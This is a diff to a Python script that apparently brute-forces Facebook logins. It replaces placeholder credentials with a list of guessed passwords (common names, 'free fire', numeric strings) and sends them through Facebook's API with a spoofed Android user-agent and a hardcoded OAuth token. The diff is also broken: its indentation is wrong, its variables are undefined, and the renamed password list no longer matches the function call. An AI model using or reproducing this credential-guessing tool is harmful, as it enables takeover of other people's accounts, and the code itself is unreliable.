@@ -80,8 +80,8 @@ import requests as r
 def login():
     os.system("clear")
     print("\033[1;37m")
-    uid = "id lagale"
-    pww = "pass lagale"
+            uid = love+lova+lovb+guru
+			pwx = [lova+lovb+guru,love+lova+lovb,love+love,'bangladesh','sadiya','hridoy','sahin','nusrat','fatema','sabbir','mababa','708090','908070','free fire','freefire1234']
     ua = "[FBAN/Orca-Android;FBAV/5.0.0.16.1;FBLC/tr_TR;FBBV/2302400;FBCR/ T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/GT-I9300;FBSV/4.0.4;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.0,width=1066,height=552};]"
     check(uid, pww, ua)
 
@@ -104,7 +104,7 @@ def check(uid, pww, ua):
             "currently_logged_in_userid": "0",
         }
         headers = {
-            "User-Agent": ua,
+            "User-Agent": ua, 
             "Content-Type": "application/x-www-form-urlencoded",
             "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
             "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
@@ -121,7 +121,7 @@ def check(uid, pww, ua):
 
 login()
 
-email or password Laga Lo aur test kro
+
 logo = ("""
 \033[1;33m  ░█▀▀▀█ ░█─░█ ─█▀▀█ ░█▄─░█ ▀▀█▀▀ ░█▀▀▀█ 
 \033[1;32m  ─▀▀▀▄▄ ░█▀▀█ ░█▄▄█ ░█░█░█ ─░█── ░█──░█ 
